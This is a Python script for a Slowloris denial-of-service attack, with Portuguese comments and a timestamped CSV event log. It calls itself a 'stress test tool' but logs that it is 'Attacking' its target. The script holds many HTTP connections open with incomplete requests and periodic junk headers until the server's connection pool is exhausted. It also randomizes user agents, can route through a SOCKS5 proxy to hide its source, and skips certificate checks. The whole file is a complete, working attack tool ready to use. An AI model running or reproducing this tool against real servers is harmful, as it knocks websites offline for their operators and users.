#!/usr/bin/env python3
import argparse
import csv
import logging
import os
import random
import socket
import sys
import time
from datetime import datetime, timezone

# Funções de parsing de argumentos.
parser = argparse.ArgumentParser(
    description="Stress test tool for websites and other webapps."
)
parser.add_argument("url", nargs="?", help="URL that will be tested.")

parser.add_argument(
    "-p", "--port", default=80, help="Port of the webserver that will be tested, defaults to 80", type=int
)

parser.add_argument(
    "-s",
    "--sockets",
    default=150,
    help="Number of sockets that will be used in testing, defaults to 150",
    type=int,
)

parser.add_argument(
    "-v",
    "--verbose",
    dest="verbose",
    action="store_true",
    help="Verbose Logs",
)
parser.add_argument(
    "-ua",
    "--randuseragents",
    dest="randuseragent",
    action="store_true",
    help="Randomizes User Agents for each request",
)
parser.add_argument(
    "-x",
    "--useproxy",
    dest="useproxy",
    action="store_true",
    help="Use a SOCKS5 proxy for the connection",
)
parser.add_argument(
    "--proxy-url", default="127.0.0.1", help="SOCKS5 proxy url"
)
parser.add_argument(
    "--proxy-port", default="8080", help="SOCKS5 proxy port", type=int
)
parser.add_argument(
    "--https",
    dest="https",
    action="store_true",
    help="Use HTTPS for the requests",
)
parser.add_argument(
    "-d",
    "--delay",
    dest="delay",
    default=15,
    type=int,
    help="Delay in seconds between each request, defaults to 5 seconds.",
)
parser.add_argument(
    "--csv",
    nargs="?",
    const=True,
    default=True,
    metavar="PATH",
    help="Write a timestamped CSV event log to PATH. Enabled by default with an "
         "auto-generated filename; pass a path to choose one.",
)
parser.add_argument(
    "--no-csv",
    dest="csv",
    action="store_const",
    const=False,
    help="Disable the CSV event log.",
)

# Define o valor default das variaveis booleans.
parser.set_defaults(verbose=False)
parser.set_defaults(randuseragent=False)
parser.set_defaults(useproxy=False)
parser.set_defaults(https=False)
args = parser.parse_args()

# Chama o help, e fecha a função
if len(sys.argv) <= 1:
    parser.print_help()
    sys.exit(1)

# Avisa se faltar URLs
if not args.url:
    print("URL required!")
    parser.print_help()
    sys.exit(1)


# ---------------------------------------------------------------------------
# CSV event log
# ---------------------------------------------------------------------------
class CsvLogHandler(logging.Handler):
    """Logging handler that appends every record to a CSV file as a row.

    Thread-safe via the base Handler lock, flushed on every write so the tail
    of the file survives a crash or Ctrl-C.
    """

    FIELDS = ("ts_iso", "ts_epoch", "level", "event", "socket_id", "detail")

    def __init__(self, path):
        super().__init__(level=logging.DEBUG)
        self.path = path
        new = not os.path.exists(path) or os.path.getsize(path) == 0
        self._fh = open(path, "a", newline="", encoding="utf-8")
        self._writer = csv.DictWriter(self._fh, fieldnames=self.FIELDS)
        if new:
            self._writer.writeheader()
            self._fh.flush()

    def emit(self, record):
        try:
            now = time.time()
            row = {
                "ts_iso": datetime.fromtimestamp(now, timezone.utc).isoformat(
                    timespec="milliseconds"
                ),
                "ts_epoch": f"{now:.3f}",
                "level": record.levelname,
                "event": getattr(record, "event", record.name),
                "socket_id": getattr(record, "socket_id", ""),
                "detail": record.getMessage().replace("\n", " ")[:1000],
            }
            self._writer.writerow(row)
            self._fh.flush()
        except Exception:
            self.handleError(record)

    def close(self):
        try:
            if not self._fh.closed:
                self._fh.flush()
                self._fh.close()
        finally:
            super().close()


def log_event(event, level=logging.INFO, socket_id="", **fields):
    """Emit a structured event row: event name plus key=value detail."""
    detail = " ".join(f"{k}={v}" for k, v in fields.items())
    logging.getLogger().log(
        level, detail, extra={"event": event, "socket_id": socket_id}
    )


csv_handler = None
if args.csv:
    csv_path = (
        args.csv
        if isinstance(args.csv, str)
        else f"slowloris_{time.strftime('%Y%m%d_%H%M%S')}.csv"
    )
    try:
        csv_handler = CsvLogHandler(csv_path)
    except OSError as e:
        print(f"Could not open CSV log {csv_path}: {e}", file=sys.stderr)
        csv_handler = None


# importa e usa as socks se forem necessárias
if args.useproxy:
    try:
        import socks

        socks.setdefaultproxy(
            socks.PROXY_TYPE_SOCKS5, args.proxy_url, args.proxy_port
        )
        socket.socket = socks.socksocket
        logging.info("Using SOCKS5 proxy for connecting...")
    except ImportError:
        logging.error("Socks Proxy Library Not Available!")
        sys.exit(1)

# Logging: root at DEBUG so the CSV handler sees everything, console filtered.
_root = logging.getLogger()
_root.setLevel(logging.DEBUG)

_console = logging.StreamHandler()
_console.setLevel(logging.DEBUG if args.verbose else logging.INFO)
_console.setFormatter(
    logging.Formatter("[%(asctime)s] %(message)s", "%d-%m-%Y %H:%M:%S")
)
_root.addHandler(_console)

if csv_handler:
    _root.addHandler(csv_handler)


# Linha a enviar.
def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))


# Header a enviar.
def send_header(self, name, value):
    self.send_line(f"{name}: {value}")


# Função que só é ativada se for necessário usar o HTTPS
if args.https:
    logging.info("Importing SSL Module")
    import ssl

    setattr(ssl.SSLSocket, "send_line", send_line)
    setattr(ssl.SSLSocket, "send_header", send_header)

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)


# Cria a primeira iteração das sockets
def init_socket(ip: str, sid: str = ""):
    t0 = time.monotonic()
    log_event("connect_start", level=logging.DEBUG, socket_id=sid, target=f"{ip}:{args.port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if args.https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=args.url)

    try:
        s.connect((ip, args.port))
    except socket.error as e:
        log_event(
            "connect_error",
            level=logging.DEBUG,
            socket_id=sid,
            error=type(e).__name__,
            elapsed_ms=f"{(time.monotonic() - t0) * 1000:.1f}",
        )
        raise

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    ua = user_agents[0]
    if args.randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")

    log_event(
        "connect_ok",
        level=logging.DEBUG,
        socket_id=sid,
        elapsed_ms=f"{(time.monotonic() - t0) * 1000:.1f}",
    )
    return s


# Iterações futuras das sockets.
def iterations():
    logging.info("Sending Headers...")
    logging.info("Socket count: %s", len(list_of_sockets))
    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
            log_event("keepalive_sent", level=logging.DEBUG, socket_id=s._sid)
        except socket.error as e:
            log_event(
                "socket_lost",
                level=logging.DEBUG,
                socket_id=getattr(s, "_sid", ""),
                error=type(e).__name__,
            )
            list_of_sockets.remove(s)

    diff = args.sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for i in range(diff):
        sid = f"r{i:04d}"
        try:
            s = init_socket(args.url, sid)
            if not s:
                continue
            s._sid = sid
            list_of_sockets.append(s)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)
            break


# Função main
def main():
    ip = args.url
    socket_count = args.sockets
    if csv_handler:
        log_event("csv_log_opened", path=csv_handler.path)
    log_event(
        "start",
        target=ip,
        port=args.port,
        sockets=socket_count,
        delay_s=args.delay,
        tls=args.https,
        proxy=args.useproxy,
    )
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating Sockets...")
    t_start = time.monotonic()
    for i in range(socket_count):
        sid = f"s{i:04d}"
        try:
            logging.debug("Creating Socket #%s", i)
            s = init_socket(ip, sid)
        except socket.error as e:
            logging.debug(e)
            break
        s._sid = sid
        list_of_sockets.append(s)

    log_event("sockets_ready", count=len(list_of_sockets))

    try:
        while True:
            try:
                iterations()
            except (KeyboardInterrupt, SystemExit):
                logging.info("Stopping...")
                break
            except Exception as e:
                logging.debug("Error in iteration: %s", e)
                log_event("iteration_error", level=logging.DEBUG, error=repr(e))
            logging.debug("Sleeping for %d seconds", args.delay)
            time.sleep(args.delay)
    finally:
        log_event(
            "stop",
            sockets_alive=len(list_of_sockets),
            uptime_s=f"{time.monotonic() - t_start:.1f}",
        )
        for s in list_of_sockets:
            try:
                s.close()
            except OSError:
                pass
        if csv_handler:
            csv_handler.close()


if __name__ == "__main__":
    main()